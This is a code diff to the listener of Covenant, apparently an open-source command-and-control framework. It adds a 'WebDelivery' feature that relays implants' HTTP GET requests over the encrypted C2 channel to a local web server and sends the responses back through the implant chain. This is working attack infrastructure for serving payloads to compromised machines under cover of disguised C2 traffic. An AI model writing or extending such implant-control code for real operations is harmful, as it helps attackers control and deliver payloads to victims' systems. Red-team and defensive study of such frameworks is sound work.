@@ -2,6 +2,7 @@
 using System.IO;
 using System.Xml;
 using System.Linq;
+using System.Net;
 using System.Net.Http;
 using System.Threading.Tasks;
 using System.Reflection;
@@ -18,6 +19,7 @@ using Newtonsoft.Json;
 using Covenant.Core;
 using Covenant.API;
 using APIModels = Covenant.API.Models;
+using System.Text.RegularExpressions;
 
 namespace Covenant.Models.Listeners
 {
@@ -197,6 +199,12 @@ namespace Covenant.Models.Listeners
                                 Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
                             }
                             break;
+                    }
+                    break;
+                case APIModels.GruntTaskingType.WebDelivery:
+                    if (tasking.Parameters.Count >= 1)
+                    {
+                        Message = string.Join(",", tasking.Parameters);
                     }
                     break;
                 case APIModels.GruntTaskingType.SetOption:
@@ -511,7 +519,81 @@ namespace Covenant.Models.Listeners
                 return;
             }
 
-			string TaskName = outputMessage.Meta;
+            if (outputMessage.Type == ModelUtilities.GruntEncryptedMessageType.WebDelivery)
+            {
+                try
+                {
+                    string httpRequest = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, outputMessage));
+                    System.Threading.Thread httpClient = new System.Threading.Thread(() =>
+                    {
+                        string rawResponse = String.Format("HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n");
+                        string requestId = outputMessage.Meta;
+                        try
+                        {
+                            string[] headerRows = httpRequest.Split("\r\n");
+                            if (headerRows.Length >= 1)
+                            {
+                                // Only accept GET requests and only use the request's path and protocol information (ignore all headers)
+                                var regex = new Regex(@"^GET\s+/(?<path>.+?)\s+(?<protocol>HTTP/\d+\.\d+)$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
+                                Match match = regex.Match(headerRows[0]);
+                                if (match.Success)
+                                {
+                                    Group path = match.Groups["path"];
+                                    Group protocol = match.Groups["protocol"];
+                                    using (var webClient = new WebClient())
+                                    {
+                                        rawResponse = String.Format("{0} 200 OK\r\n", protocol.Value);
+                                        try
+                                        {
+                                            string response = webClient.DownloadString(String.Format("http://127.0.0.1:80/{0}", path.Value));
+                                            rawResponse += webClient.ResponseHeaders.ToString();
+                                            rawResponse += response;
+                                        }
+                                        catch (WebException)
+                                        {
+                                            rawResponse = String.Format("{0} 404 Not Found\r\nContent-Length: 0\r\n\r\n", protocol.Value);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        catch (Exception)
+                        {
+                        }
+                        // Send data back
+                        APIModels.GruntTaskingMessage httpResponse = new APIModels.GruntTaskingMessage
+                        {
+                            Message = rawResponse,
+                            Name = requestId,
+                            Type = APIModels.GruntTaskingType.WebDelivery,
+                            Token = false
+                        };
+                        ModelUtilities.GruntEncryptedMessage responseMessage;
+                        try
+                        {
+                            responseMessage = this.CreateMessageForGrunt(egressGrunt, targetGrunt, httpResponse);
+                            responseMessage.Type = ModelUtilities.GruntEncryptedMessageType.WebDelivery;
+                        }
+                        catch (HttpOperationException)
+                        {
+                            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                            return;
+                        }
+                        // Transform response
+                        string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
+                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+                    });
+                    httpClient.IsBackground = true;
+                    httpClient.Start();
+                }
+                catch (Exception ex)
+                {
+
+                }
+                return;
+            }
+
+            string TaskName = outputMessage.Meta;
 			if (string.IsNullOrWhiteSpace(TaskName))
 			{
                 // Invalid task response. This happens on post-register write
@@ -893,7 +975,8 @@ namespace Covenant.Models.Listeners
             public enum GruntEncryptedMessageType
             {
                 Routing,
-                Tasking
+                Tasking,
+                WebDelivery
             }
 
             public class GruntEncryptedMessage
